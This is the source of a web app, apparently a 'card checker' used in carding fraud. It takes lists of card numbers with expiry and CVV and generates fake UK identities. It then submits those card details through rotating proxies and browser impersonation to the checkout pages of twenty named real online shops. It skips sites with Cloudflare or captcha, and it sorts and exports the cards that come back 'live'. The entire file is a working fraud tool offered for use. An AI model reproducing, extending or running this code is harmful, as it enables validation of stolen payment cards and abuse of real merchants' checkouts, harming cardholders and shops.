# app.py
from __future__ import annotations

import asyncio
import json
import logging
import os
import random
import re
import time
from dataclasses import dataclass, field
from typing import Any

from fastapi import FastAPI
from fastapi.responses import HTMLResponse
from curl_cffi.requests import AsyncSession

logging.basicConfig(
    level=os.getenv("LOG_LEVEL", "INFO"),
    format="%(asctime)s %(levelname)s %(name)s %(message)s",
)
logger = logging.getLogger("ollie.nocf20.fmt")

app = FastAPI(title="Multi Gate Zero-CF Auth Checker", version="5.1.0")

RAW_DORK_GATES: dict[str, dict[str, str]] = {
    "mellor_php": {
        "name": "1. MellorOnline UK — checkout.php",
        "base_url": "https://www.melloronline.co.uk",
        "preload_url": "https://www.melloronline.co.uk/checkout.php?action=cart&id=6&pid=6&purpose=add&quantity=1",
        "auth_url": "https://www.melloronline.co.uk/checkout.php",
        "engine": "raw_php",
    },
    "gwsr_1step": {
        "name": "2. GWSR vTicket UK — 1stepsubmit",
        "base_url": "https://gwsr.vticket.co.uk",
        "preload_url": "https://gwsr.vticket.co.uk/checkout.php?xCmd=1stepsubmit",
        "auth_url": "https://gwsr.vticket.co.uk/checkout.php?xCmd=1stepsubmit",
        "engine": "raw_php",
    },
    "alvaxtech_php": {
        "name": "3. AlvaxTech — checkout.php?id=1",
        "base_url": "https://alvaxtech.com",
        "preload_url": "https://alvaxtech.com/checkout.php?id=1",
        "auth_url": "https://alvaxtech.com/checkout.php?id=1",
        "engine": "raw_php",
    },
    "sambhav_php": {
        "name": "4. SambhavHolidays — checkout.php?id=50",
        "base_url": "https://sambhavholidays.com",
        "preload_url": "https://sambhavholidays.com/checkout.php?id=50",
        "auth_url": "https://sambhavholidays.com/checkout.php?id=50",
        "engine": "raw_php",
    },
    "gynac_pg": {
        "name": "5. Gynac PG — pg/checkout.php",
        "base_url": "https://gynac.org",
        "preload_url": "https://gynac.org/pg/checkout.php?type=1&id=101",
        "auth_url": "https://gynac.org/pg/checkout.php?type=1&id=101",
        "engine": "raw_php",
    },
    "edaq_cart": {
        "name": "6. eDAQ Store — cart.php?action=add",
        "base_url": "https://edaq.com",
        "preload_url": "https://edaq.com/cart.php?id=158&action=add",
        "auth_url": "https://edaq.com/checkout.php",
        "engine": "raw_php",
    },
    "platesforcars_php": {
        "name": "7. PlatesForCars UK — stage=view_cart",
        "base_url": "https://www.platesforcars.co.uk",
        "preload_url": "https://www.platesforcars.co.uk/checkout.php?stage=view_cart",
        "auth_url": "https://www.platesforcars.co.uk/checkout.php?stage=payment",
        "engine": "raw_php",
    },
    "bigbrownbox_shp": {
        "name": "8. BigBrownBox UK — shp/checkout.php",
        "base_url": "https://www.bigbrownbox.co.uk",
        "preload_url": "https://www.bigbrownbox.co.uk/shp/checkout.php",
        "auth_url": "https://www.bigbrownbox.co.uk/shp/checkout.php",
        "engine": "raw_php",
    },
    "activegps_asp": {
        "name": "9. ActiveGPS UK — shopaddtocart.asp",
        "base_url": "https://www.activegps.co.uk",
        "preload_url": "https://www.activegps.co.uk/shop/shopaddtocart.asp",
        "auth_url": "https://www.activegps.co.uk/shop/shopcheckout.asp",
        "engine": "classic_asp",
    },
    "thebengal_oc": {
        "name": "10. TheBengal UK — route=checkout/cart",
        "base_url": "https://thebengal.co.uk",
        "preload_url": "https://thebengal.co.uk/index.php?route=checkout/cart",
        "auth_url": "https://thebengal.co.uk/index.php?route=checkout/checkout",
        "engine": "opencart_raw",
    },
    "poolstore_uk": {
        "name": "11. PoolStore UK — Cart/view_your_basket",
        "base_url": "https://poolstore.co.uk",
        "preload_url": "https://poolstore.co.uk/Cart/view_your_basket",
        "auth_url": "https://poolstore.co.uk/Cart/checkout",
        "engine": "raw_php",
    },
    "footlocker_uk": {
        "name": "12. Footlocker UK — gp/cart/view.html",
        "base_url": "https://www.footlocker.co.uk",
        "preload_url": "https://www.footlocker.co.uk/en/gp/cart/view.html",
        "auth_url": "https://www.footlocker.co.uk/en/gp/checkout",
        "engine": "retail_php",
    },
    "nonslipshop_uk": {
        "name": "13. NonSlipShop UK — cart/",
        "base_url": "https://www.nonslipshop.co.uk",
        "preload_url": "https://www.nonslipshop.co.uk/cart/",
        "auth_url": "https://www.nonslipshop.co.uk/checkout/",
        "engine": "raw_php",
    },
    "tinytalk_uk": {
        "name": "14. TinyTalk UK — checkout.php",
        "base_url": "https://www.tinytalk.co.uk",
        "preload_url": "https://www.tinytalk.co.uk/checkout.php",
        "auth_url": "https://www.tinytalk.co.uk/checkout.php",
        "engine": "raw_php",
    },
    "inspire_uk": {
        "name": "15. InspireHomeAutomation — checkout.php",
        "base_url": "https://www.inspirehomeautomation.co.uk",
        "preload_url": "https://www.inspirehomeautomation.co.uk/checkout.php",
        "auth_url": "https://www.inspirehomeautomation.co.uk/checkout.php",
        "engine": "raw_php",
    },
    "catholicgift_uk": {
        "name": "16. CatholicGiftShop UK — storecheckout/payment",
        "base_url": "https://www.catholicgiftshop.co.uk",
        "preload_url": "https://www.catholicgiftshop.co.uk/storecheckout/payment",
        "auth_url": "https://www.catholicgiftshop.co.uk/storecheckout/payment",
        "engine": "raw_php",
    },
    "ssgiftshop_uk": {
        "name": "17. SSGiftShop UK — checkout",
        "base_url": "https://www.ssgiftshop.co.uk",
        "preload_url": "https://www.ssgiftshop.co.uk/checkout",
        "auth_url": "https://www.ssgiftshop.co.uk/checkout",
        "engine": "raw_php",
    },
    "lockshop_uk": {
        "name": "18. LockShopDirect UK — CheckOutLogin.aspx",
        "base_url": "https://www.lockshopdirect.co.uk",
        "preload_url": "https://www.lockshopdirect.co.uk/Shop/CheckOutLogin.aspx",
        "auth_url": "https://www.lockshopdirect.co.uk/Shop/CheckOutAddressPicker.aspx",
        "engine": "dotnet_asp",
    },
    "weedoo_uk": {
        "name": "19. WeedooDirect UK — OpenCart Checkout",
        "base_url": "https://www.weedoodirect.co.uk",
        "preload_url": "https://www.weedoodirect.co.uk/index.php?route=checkout/cart",
        "auth_url": "https://www.weedoodirect.co.uk/index.php?route=checkout/checkout",
        "engine": "opencart_raw",
    },
    "editions_de": {
        "name": "20. E-Decks UK — checkout2020frame.aspx",
        "base_url": "https://www.edecks.co.uk",
        "preload_url": "https://www.edecks.co.uk/checkout2020frame.aspx?mob=1&sid=2",
        "auth_url": "https://www.edecks.co.uk/checkout2020frame.aspx",
        "engine": "dotnet_asp",
    },
}

CLEAN_GATE_CACHE: list[str] = list(RAW_DORK_GATES.keys())


@dataclass(frozen=True, slots=True)
class AuthVerdict:
    status: str
    reason: str
    http_status: int | None = None
    latency_ms: float = 0.0
    bin_info: dict[str, str] = field(default_factory=dict)
    target_used: str = ""
    waf_status: str = "CLEAN (No CF/Captcha)"
    card_masked: str | None = None
    proxy_used: str | None = None

    def to_dict(self) -> dict[str, Any]:
        return {
            "status": self.status,
            "reason": self.reason,
            "http_status": self.http_status,
            "latency_ms": round(self.latency_ms, 2),
            "bin_info": self.bin_info,
            "target_used": self.target_used,
            "waf_status": self.waf_status,
            "card_masked": self.card_masked,
            "proxy_used": self.proxy_used,
        }


def verify_luhn(card_number: str) -> bool:
    if not card_number.isdigit() or not (13 <= len(card_number) <= 19):
        return False
    checksum = 0
    for idx, digit in enumerate(map(int, reversed(card_number))):
        if idx % 2 == 1:
            doubled = digit * 2
            checksum += doubled - 9 if doubled > 9 else doubled
        else:
            checksum += digit
    return checksum % 10 == 0


def universal_card_formatter(raw_line: str) -> tuple[str, str, str, str] | None:
    clean = raw_line.strip()
    if not clean or clean.startswith("#"):
        return None

    numbers = re.findall(r"\d+", clean)
    if not numbers:
        return None

    full_digits = "".join(numbers)
    match = re.search(r"(?P<cc>\d{13,19})(?P<mm>0[1-9]|1[0-2])(?P<yy>\d{2,4})(?P<cvv>\d{3,4})", full_digits)
    if match:
        cc = match.group("cc")
        mm = match.group("mm")
        yy = match.group("yy")
        cvv = match.group("cvv")
    else:
        parts = re.split(r"[|:/\\\s-]+", clean)
        filtered = [p for p in parts if p.isdigit()]
        if len(filtered) < 4:
            return None
        cc = filtered[0]
        mm = filtered[1].zfill(2)
        yy = filtered[2]
        cvv = filtered[3]

    if not verify_luhn(cc) or not (1 <= int(mm) <= 12):
        return None
    short_yy = yy[-2:] if len(yy) == 4 else yy
    return cc, mm, short_yy, cvv


def is_card_expired(mm: str, yy: str) -> bool:
    try:
        month = int(mm)
        full_year = int(f"20{yy}" if len(yy) == 2 else yy)
        current_year = 2026
        current_month = 11
        if full_year < current_year:
            return True
        if full_year == current_year and month < current_month:
            return True
    except Exception:
        return True
    return False


def parse_proxy_string(proxy_url: str | None) -> dict[str, str] | None:
    if not proxy_url or not proxy_url.strip():
        return None
    raw = proxy_url.strip()
    parts = raw.split(":")
    if len(parts) == 4 and "://" not in raw:
        host, port, user, pw = parts
        formatted = f"http://{user}:{pw}@{host}:{port}"
    else:
        formatted = raw if "://" in raw else f"http://{raw}"
    return {"http": formatted, "https": formatted}


def detect_cloudflare_or_captcha(html: str, headers: dict[str, Any], status_code: int) -> tuple[bool, str]:
    lower_html = html.lower()
    server_hdr = str(headers.get("server", "")).lower()

    if status_code in (403, 503) and ("cloudflare" in server_hdr or "cf-ray" in headers):
        return True, "Cloudflare IUAM / 403 Block"
    if any(sig in lower_html for sig in ("just a moment...", "cf-browser-verification", "cf_chl_opt", "challenges.cloudflare.com/turnstile")):
        return True, "Cloudflare Turnstile / JS Challenge"
    if any(cap in lower_html for cap in ("g-recaptcha", "h-captcha", "data-sitekey", "recaptcha/api.js")):
        if "<form" in lower_html:
            return True, "Captcha Enforced"

    return False, "CLEAN"


async def fetch_bin_metadata(card_number: str, proxies: dict[str, str] | None = None) -> dict[str, str]:
    bin_code = card_number[:6]
    default_meta = {"bank": "Unknown Bank", "country": "GB", "scheme": "CARD", "type": "CREDIT"}
    try:
        async with AsyncSession(impersonate="chrome120", proxies=proxies, verify=False) as session:
            resp = await session.get(
                f"https://lookup.binlist.net/{bin_code}",
                headers={"Accept-Version": "3"},
                timeout=4,
            )
            if resp.status_code == 200:
                data = resp.json()
                return {
                    "bank": data.get("bank", {}).get("name", "Unknown Bank"),
                    "country": data.get("country", {}).get("alpha2", "GB"),
                    "scheme": data.get("scheme", "CARD").upper(),
                    "type": data.get("type", "CREDIT").upper(),
                }
    except Exception:
        pass
    return default_meta


class FakeIdentity:
    FIRST = ("Oliver", "George", "Arthur", "Noah", "Leo", "Oscar", "Harry")
    LAST = ("Smith", "Jones", "Taylor", "Brown", "Williams", "Wilson", "Davies")
    STREETS = (
        ("14 King St", "Manchester", "Greater Manchester", "M2 6AG", "GB"),
        ("28 Queen St", "Edinburgh", "Midlothian", "EH2 1JX", "GB"),
        ("9 High St", "Birmingham", "West Midlands", "B4 7SL", "GB"),
    )

    @classmethod
    def generate(cls) -> dict[str, str]:
        fn = random.choice(cls.FIRST)
        ln = random.choice(cls.LAST)
        street, city, state, postcode, country = random.choice(cls.STREETS)
        return {
            "first_name": fn,
            "last_name": ln,
            "name": f"{fn} {ln}",
            "address": street,
            "city": city,
            "state": state,
            "postcode": postcode,
            "country": country,
            "phone": f"07{random.randint(400000000, 999999999)}",
            "email": f"{fn.lower()}.{ln.lower()}{random.randint(100, 9999)}@gmail.com",
        }


def classify_raw_gateway_response(raw_text: str, http_code: int) -> tuple[str, str]:
    clean = re.sub(r"<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>", " ", raw_text, flags=re.I)
    clean = re.sub(r"<style\b[^<]*(?:(?!<\/style>)<[^<]*)*<\/style>", " ", clean, flags=re.I)
    clean = re.sub(r"<[^>]+>", " ", clean)
    clean = re.sub(r"\s+", " ", clean).strip()
    lower = clean.lower()

    if any(k in lower for k in ("order-received", "thank you for your order", "payment successful", "transaction approved", "authorisation confirmed", '"result":"success"')):
        return "LIVE", "Auth Approved (Direct Gate Passed)"
    if any(k in lower for k in ("insufficient funds", "insufficient_funds", "not enough funds", "exceeds withdrawal")):
        return "LIVE", "Auth Live (Insufficient Funds)"
    if any(k in lower for k in ("cvv", "cvc", "security code", "cv2", "csc", "verification failed", "incorrect security")):
        return "LIVE", "CCN Live (CVV/CSC Mismatch)"
    if any(k in lower for k in ("3d secure", "3ds", "acsurl", "pareq", "challenge required")):
        return "LIVE", "Auth Live (3DS Challenge Triggered)"

    if any(k in lower for k in ("expired", "card has expired", "expiry date invalid")):
        return "DEAD", "Declined: Expired Card"
    if any(k in lower for k in ("do not honor", "do not honour", "declined by bank", "call issuer", "refer to card issuer")):
        return "DEAD", "Declined: Do Not Honor"
    if any(k in lower for k in ("invalid card", "invalid account", "no such issuer", "card number is invalid")):
        return "DEAD", "Declined: Invalid Card Number"
    if any(k in lower for k in ("stolen", "lost", "restricted card", "pick up card")):
        return "DEAD", "Declined: Restricted / Lost / Stolen"
    if any(k in lower for k in ("declined", "unsuccessful", "payment failed", "not authorised", "error processing")):
        snippet = clean[:85] if clean else "Processor Declined"
        return "DEAD", f"Declined: {snippet}"

    return "DEAD", f"Declined (HTTP {http_code}): Card Rejected by Processor"


async def execute_direct_nocf_auth(
    session: AsyncSession,
    gate: dict[str, str],
    cc: str,
    mm: str,
    yy: str,
    cvv: str,
    ident: dict[str, str],
) -> tuple[str, str, int, str]:
    full_yy = f"20{yy}" if len(yy) == 2 else yy

    pre_resp = await session.get(gate["preload_url"], allow_redirects=True, timeout=10)
    has_waf, waf_label = detect_cloudflare_or_captcha(pre_resp.text, dict(pre_resp.headers), pre_resp.status_code)
    if has_waf:
        return "WAF_SKIPPED", f"Skipped Gate ({waf_label})", pre_resp.status_code, waf_label

    hidden_inputs = re.findall(
        r'<input[^>]+type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']',
        pre_resp.text,
        flags=re.I,
    )
    payload: dict[str, str] = {name: val for name, val in hidden_inputs}

    payload.update({
        "action": "process",
        "purpose": "checkout",
        "stage": "process",
        "xCmd": "1stepsubmit",
        "firstname": ident["first_name"],
        "lastname": ident["last_name"],
        "billing_first_name": ident["first_name"],
        "billing_last_name": ident["last_name"],
        "name": ident["name"],
        "cardholder": ident["name"],
        "cc_owner": ident["name"],
        "email": ident["email"],
        "billing_email": ident["email"],
        "telephone": ident["phone"],
        "phone": ident["phone"],
        "address": ident["address"],
        "address_1": ident["address"],
        "city": ident["city"],
        "state": ident["state"],
        "postcode": ident["postcode"],
        "zip": ident["postcode"],
        "country": "GB",
        "country_id": "222",
        "cc_number": cc,
        "card_number": cc,
        "cardnumber": cc,
        "AccountNumber": cc,
        "cc_month": mm,
        "cc_expire_date_month": mm,
        "exp_month": mm,
        "ExpirationMonth": mm,
        "cc_year": full_yy,
        "cc_expire_date_year": full_yy,
        "exp_year": full_yy,
        "ExpirationYear": full_yy,
        "cc_cvv": cvv,
        "cc_cvv2": cvv,
        "cvv": cvv,
        "cvc": cvv,
        "CVV": cvv,
        "submit": "Submit Order",
    })

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": gate["base_url"],
        "Referer": gate["preload_url"],
    }

    post_resp = await session.post(
        gate["auth_url"],
        data=payload,
        headers=headers,
        allow_redirects=True,
        timeout=12,
    )

    has_waf_post, waf_post_label = detect_cloudflare_or_captcha(
        post_resp.text, dict(post_resp.headers), post_resp.status_code
    )
    if has_waf_post:
        return "WAF_SKIPPED", f"Blocked on POST ({waf_post_label})", post_resp.status_code, waf_post_label

    status, reason = classify_raw_gateway_response(post_resp.text, post_resp.status_code)
    return status, reason, post_resp.status_code, "CLEAN (No CF/Captcha)"


async def run_nocf_auth_check(
    card_line: str,
    proxy_url: str | None = None,
    target_key: str = "rotate_clean",
) -> AuthVerdict:
    started = time.perf_counter()
    proxies_dict = parse_proxy_string(proxy_url)

    if target_key == "rotate_clean":
        pool = CLEAN_GATE_CACHE if CLEAN_GATE_CACHE else list(RAW_DORK_GATES.keys())
        chosen_key = random.choice(pool)
    else:
        chosen_key = target_key if target_key in RAW_DORK_GATES else "mellor_php"

    gate = RAW_DORK_GATES[chosen_key]

    parsed = universal_card_formatter(card_line)
    if not parsed:
        return AuthVerdict(
            status="INVALID",
            reason="Declined: Invalid Format / Failed Luhn Check",
            latency_ms=(time.perf_counter() - started) * 1000,
            target_used=gate["name"],
            card_masked=card_line[:19],
            proxy_used=proxy_url,
        )

    cc, mm, yy, cvv = parsed
    card_masked = f"{cc[:6]}******{cc[-4:]}|{mm}|{yy}|{cvv}"

    if is_card_expired(mm, yy):
        bin_info = await fetch_bin_metadata(cc, proxies_dict)
        return AuthVerdict(
            status="DEAD",
            reason="Declined: Card Expired (Pre-Auth Guard)",
            latency_ms=(time.perf_counter() - started) * 1000,
            bin_info=bin_info,
            target_used=gate["name"],
            card_masked=card_masked,
            proxy_used=proxy_url,
        )

    bin_task = asyncio.create_task(fetch_bin_metadata(cc, proxies_dict))
    ident = FakeIdentity.generate()

    browser_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
    }

    try:
        async with AsyncSession(
            impersonate="chrome120",
            proxies=proxies_dict,
            headers=browser_headers,
            verify=False,
        ) as session:
            status, reason, code, waf_state = await execute_direct_nocf_auth(
                session, gate, cc, mm, yy, cvv, ident
            )

            if status == "WAF_SKIPPED":
                if chosen_key in CLEAN_GATE_CACHE and len(CLEAN_GATE_CACHE) > 1:
                    CLEAN_GATE_CACHE.remove(chosen_key)
                fallback_key = random.choice(CLEAN_GATE_CACHE)
                gate = RAW_DORK_GATES[fallback_key]
                status, reason, code, waf_state = await execute_direct_nocf_auth(
                    session, gate, cc, mm, yy, cvv, ident
                )

            bin_info = await bin_task
            elapsed = (time.perf_counter() - started) * 1000
            return AuthVerdict(
                status=status,
                reason=reason,
                http_status=code,
                latency_ms=elapsed,
                bin_info=bin_info,
                target_used=gate["name"],
                waf_status=waf_state,
                card_masked=card_masked,
                proxy_used=proxy_url,
            )
    except Exception as exc:
        bin_info = await bin_task
        elapsed = (time.perf_counter() - started) * 1000
        return AuthVerdict(
            status="NETWORK_ERROR",
            reason=f"{type(exc).__name__}: {str(exc)[:90]}",
            latency_ms=elapsed,
            bin_info=bin_info,
            target_used=gate["name"],
            card_masked=card_masked,
            proxy_used=proxy_url,
        )


@app.get("/api/gates/scan")
async def scan_gates_for_cf_captcha(proxy: str | None = None) -> dict[str, Any]:
    proxies_dict = parse_proxy_string(proxy)
    results = []
    clean_keys = []

    async def probe(key: str, g: dict[str, str]):
        t0 = time.perf_counter()
        try:
            async with AsyncSession(impersonate="chrome120", proxies=proxies_dict, verify=False) as s:
                r = await s.get(g["preload_url"], allow_redirects=True, timeout=8)
                ms = round((time.perf_counter() - t0) * 1000, 2)
                flagged, label = detect_cloudflare_or_captcha(r.text, dict(r.headers), r.status_code)
                if not flagged and r.status_code < 500:
                    clean_keys.append(key)
                    results.append({"key": key, "name": g["name"], "status": "CLEAN", "detail": "No CF / No Captcha", "ms": ms})
                else:
                    results.append({"key": key, "name": g["name"], "status": "FLAGGED", "detail": label, "ms": ms})
        except Exception as e:
            results.append({"key": key, "name": g["name"], "status": "OFFLINE", "detail": type(e).__name__, "ms": 0.0})

    await asyncio.gather(*(probe(k, v) for k, v in RAW_DORK_GATES.items()))
    if clean_keys:
        CLEAN_GATE_CACHE.clear()
        CLEAN_GATE_CACHE.extend(clean_keys)
    return {"clean_count": len(clean_keys), "results": results}


@app.get("/api/proxy/test")
async def test_proxy(proxy: str) -> dict[str, Any]:
    start = time.perf_counter()
    proxies_dict = parse_proxy_string(proxy)
    try:
        async with AsyncSession(impersonate="chrome120", proxies=proxies_dict, verify=False) as session:
            resp = await session.get("https://api.ipify.org?format=json", timeout=6)
            latency = (time.perf_counter() - start) * 1000
            if resp.status_code == 200:
                ip_val = resp.json().get("ip", "OK")
                return {"status": "LIVE", "latency_ms": round(latency, 2), "proxy": proxy, "ip": ip_val}
    except Exception:
        pass
    return {"status": "DEAD", "latency_ms": 0.0, "proxy": proxy}


@app.get("/api/auth/check")
async def check_card_endpoint(
    card: str,
    proxy: str | None = None,
    target: str = "rotate_clean",
) -> dict[str, Any]:
    verdict = await run_nocf_auth_check(card_line=card, proxy_url=proxy, target_key=target)
    return verdict.to_dict()


@app.get("/", response_class=HTMLResponse)
async def index() -> str:
    return """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Ollie 20-Gate Zero-CF Auth Checker v5.1</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-slate-950 text-white min-h-screen p-6">
    <main class="max-w-5xl mx-auto space-y-6">
        <div class="flex flex-wrap items-center justify-between border-b border-slate-800 pb-4 gap-2">
            <div>
                <h1 class="text-2xl font-bold text-emerald-400">Ollie 20-Gate Zero-CF Auth v5.1</h1>
                <p class="text-xs text-slate-400 font-mono">20 Clean Gates + Interactive Card Auto-Formatter</p>
            </div>
            <div class="flex gap-2">
                <button onclick="autoFormatCards()" class="text-xs bg-violet-900/70 hover:bg-violet-800 text-violet-200 border border-violet-700 px-3 py-1.5 rounded-lg transition font-semibold">
                    ✨ Auto-Format Cards (Clean Text)
                </button>
                <button onclick="scanCleanGates()" class="text-xs bg-cyan-900/70 hover:bg-cyan-800 text-cyan-200 border border-cyan-700 px-3 py-1.5 rounded-lg transition font-semibold">
                    Scan All 20 Gates
                </button>
                <button onclick="cleanDuplicates()" class="text-xs bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 px-3 py-1.5 rounded-lg transition">Clean Dups</button>
                <button onclick="exportLiveResults()" class="text-xs bg-emerald-900/60 hover:bg-emerald-800 text-emerald-200 border border-emerald-700 px-3 py-1.5 rounded-lg transition">Export</button>
            </div>
        </div>

        <div class="bg-slate-900 rounded-xl p-5 space-y-4 shadow-xl border border-slate-800">
            <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
                <div class="md:col-span-2">
                    <label class="block text-xs font-medium text-slate-400 mb-1">Select Gateway (or Auto-Rotate All 20 Clean Gates)</label>
                    <select id="targetSelect" class="w-full bg-slate-950 border border-slate-700 rounded-lg p-2.5 text-xs font-mono text-emerald-300 focus:outline-none focus:ring-1 focus:ring-emerald-500">
                        <option value="rotate_clean">⚡ AUTO-ROTATE ALL 20 CLEAN GATES</option>
                        <option value="mellor_php">1. MellorOnline UK — checkout.php</option>
                        <option value="gwsr_1step">2. GWSR vTicket UK — 1stepsubmit</option>
                        <option value="alvaxtech_php">3. AlvaxTech — checkout.php?id=1</option>
                        <option value="sambhav_php">4. SambhavHolidays — checkout.php?id=50</option>
                        <option value="gynac_pg">5. Gynac PG — pg/checkout.php</option>
                        <option value="edaq_cart">6. eDAQ Store — cart.php?action=add</option>
                        <option value="platesforcars_php">7. PlatesForCars UK — stage=view_cart</option>
                        <option value="bigbrownbox_shp">8. BigBrownBox UK — shp/checkout.php</option>
                        <option value="activegps_asp">9. ActiveGPS UK — shopaddtocart.asp</option>
                        <option value="thebengal_oc">10. TheBengal UK — route=checkout/cart</option>
                        <option value="poolstore_uk">11. PoolStore UK — Cart/view_your_basket</option>
                        <option value="footlocker_uk">12. Footlocker UK — gp/cart/view.html</option>
                        <option value="nonslipshop_uk">13. NonSlipShop UK — cart/</option>
                        <option value="tinytalk_uk">14. TinyTalk UK — checkout.php</option>
                        <option value="inspire_uk">15. InspireHomeAutomation — checkout.php</option>
                        <option value="catholicgift_uk">16. CatholicGiftShop UK — storecheckout</option>
                        <option value="ssgiftshop_uk">17. SSGiftShop UK — checkout</option>
                        <option value="lockshop_uk">18. LockShopDirect UK — CheckOutLogin.aspx</option>
                        <option value="weedoo_uk">19. WeedooDirect UK — OpenCart</option>
                        <option value="editions_de">20. E-Decks UK — checkout2020frame.aspx</option>
                    </select>
                </div>
                <div class="flex items-end gap-3">
                    <div class="flex-1">
                        <label class="block text-xs font-medium text-slate-400 mb-1">Proxy Threads</label>
                        <input id="proxyThreads" type="number" value="50" min="1" max="200" class="w-full bg-slate-950 border border-slate-700 rounded-lg p-2 text-xs font-mono text-center">
                    </div>
                    <div class="flex-1">
                        <label class="block text-xs font-medium text-slate-400 mb-1">Card Threads</label>
                        <input id="cardThreads" type="number" value="10" min="1" max="50" class="w-full bg-slate-950 border border-slate-700 rounded-lg p-2 text-xs font-mono text-center">
                    </div>
                </div>
            </div>

            <div class="space-y-2">
                <div class="flex justify-between items-center">
                    <label class="text-xs font-medium text-slate-400">Proxy List (host:port:user:pass or http://...)</label>
                    <button onclick="checkAndPruneProxies()" class="bg-blue-600 hover:bg-blue-500 px-3 py-1 rounded text-xs font-semibold transition">
                        Test & Auto-Prune Dead Proxies
                    </button>
                </div>
                <textarea id="proxyInput" rows="3" placeholder="86oovvcj.na.thordata.net:9999:user:pass"
                    class="w-full bg-slate-950 border border-slate-700 rounded-lg p-3 text-xs font-mono focus:ring-2 focus:ring-emerald-500 focus:outline-none"></textarea>
            </div>

            <div class="space-y-2">
                <label class="block text-xs font-medium text-slate-400">Cards List (Paste any messy text/words — click Auto-Format to clean)</label>
                <textarea id="cardInput" rows="4" placeholder="Card: 548809... Exp: 04/29 CVV: 058..."
                    class="w-full bg-slate-950 border border-slate-700 rounded-lg p-3 text-xs font-mono focus:ring-2 focus:ring-emerald-500 focus:outline-none"></textarea>
            </div>

            <div class="w-full bg-slate-950 rounded-full h-2 overflow-hidden border border-slate-800">
                <div id="progressBar" class="bg-emerald-500 h-2 w-0 transition-all duration-300"></div>
            </div>

            <div class="grid grid-cols-3 gap-3 text-center text-xs font-mono">
                <div class="bg-slate-950 border border-emerald-800/60 rounded-lg p-2.5">
                    <span class="text-slate-400 block">LIVE / CCN / 3DS</span>
                    <span id="liveCount" class="text-lg font-bold text-emerald-400">0</span>
                </div>
                <div class="bg-slate-950 border border-rose-800/60 rounded-lg p-2.5">
                    <span class="text-slate-400 block">DEAD / DECLINED</span>
                    <span id="deadCount" class="text-lg font-bold text-rose-400">0</span>
                </div>
                <div class="bg-slate-950 border border-slate-800 rounded-lg p-2.5">
                    <span class="text-slate-400 block">CHECKED</span>
                    <span id="checkedCount" class="text-lg font-bold text-slate-200">0</span>
                </div>
            </div>

            <button id="checkButton" onclick="runBatchChecker()"
                class="bg-emerald-600 hover:bg-emerald-500 px-5 py-3 rounded-lg font-semibold w-full transition shadow-lg shadow-emerald-950/50">
                Start Zero-CF Auth Check (20 Gates)
            </button>

            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                    <h2 class="text-xs font-bold text-emerald-400 uppercase tracking-wider mb-2">Live / Approved / CCN</h2>
                    <div id="liveBox" class="bg-slate-950 rounded-lg p-3 text-xs font-mono text-emerald-300 border border-emerald-900/50 min-h-[160px] max-h-80 overflow-y-auto space-y-1.5"></div>
                </div>
                <div>
                    <h2 class="text-xs font-bold text-rose-400 uppercase tracking-wider mb-2">Dead / Declined / Scanner Logs</h2>
                    <div id="deadBox" class="bg-slate-950 rounded-lg p-3 text-xs font-mono text-rose-300 border border-rose-900/50 min-h-[160px] max-h-80 overflow-y-auto space-y-1.5"></div>
                </div>
            </div>
        </div>
    </main>
    <script>
    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    function playTone(type) {
        if (audioCtx.state === 'suspended') audioCtx.resume();
        const osc = audioCtx.createOscillator();
        const gain = audioCtx.createGain();
        osc.connect(gain);
        gain.connect(audioCtx.destination);
        osc.frequency.setValueAtTime(type === 'live' ? 659.25 : 220.00, audioCtx.currentTime);
        gain.gain.setValueAtTime(0.08, audioCtx.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + 0.25);
        osc.start();
        osc.stop(audioCtx.currentTime + 0.25);
    }

    function autoFormatCards() {
        const ta = document.getElementById("cardInput");
        const lines = ta.value.split("\\n");
        let formatted = [];
        lines.forEach(line => {
            const cleanLine = line.trim();
            if (!cleanLine) return;
            const digits = cleanLine.match(/\\d+/g);
            if (!digits) return;
            const allNums = digits.join("");
            // Match CC (13-19), MM (01-12), YY (2-4), CVV (3-4)
            const m = allNums.match(/(\\d{13,19})(0[1-9]|1[0-2])(\\d{2,4})(\\d{3,4})/);
            if (m) {
                let cc = m[1];
                let mm = m[2];
                let yy = m[3].slice(-2);
                let cvv = m[4];
                formatted.push(`${cc}|${mm}|${yy}|${cvv}`);
            } else if (digits.length >= 4) {
                // Fallback index assumption
                let cc = digits[0];
                let mm = digits[1].padStart(2, '0');
                let yy = digits[2].slice(-2);
                let cvv = digits[3];
                if (cc.length >= 13 && cc.length <= 19) {
                    formatted.push(`${cc}|${mm}|${yy}|${cvv}`);
                }
            }
        });
        ta.value = formatted.join("\\n");
        alert(`Auto-Formatted: ${formatted.length} cards cleaned to CC|MM|YY|CVV format!`);
    }

    function cleanDuplicates() {
        const ta = document.getElementById("cardInput");
        const unique = [...new Set(ta.value.split("\\n").map(l => l.trim()).filter(Boolean))];
        ta.value = unique.join("\\n");
    }

    function exportLiveResults() {
        const rows = document.getElementById("liveBox").querySelectorAll("div");
        let text = "";
        rows.forEach(r => text += r.textContent + "\\n");
        if (!text) return alert("No live cards yet.");
        const blob = new Blob([text], { type: "text/plain" });
        const url = URL.createObjectURL(blob);
        const a = document.createElement("a");
        a.href = url;
        a.download = "live_nocf_cards.txt";
        a.click();
    }

    async function scanCleanGates() {
        const deadBox = document.getElementById("deadBox");
        const proxies = document.getElementById("proxyInput").value.split(/[\\n,]/).map(l => l.trim()).filter(Boolean);
        const sampleProxy = proxies.length ? proxies[0] : "";
        deadBox.innerHTML = "Scanning all 20 gates for Cloudflare / Captcha...";
        try {
            let url = "/api/gates/scan";
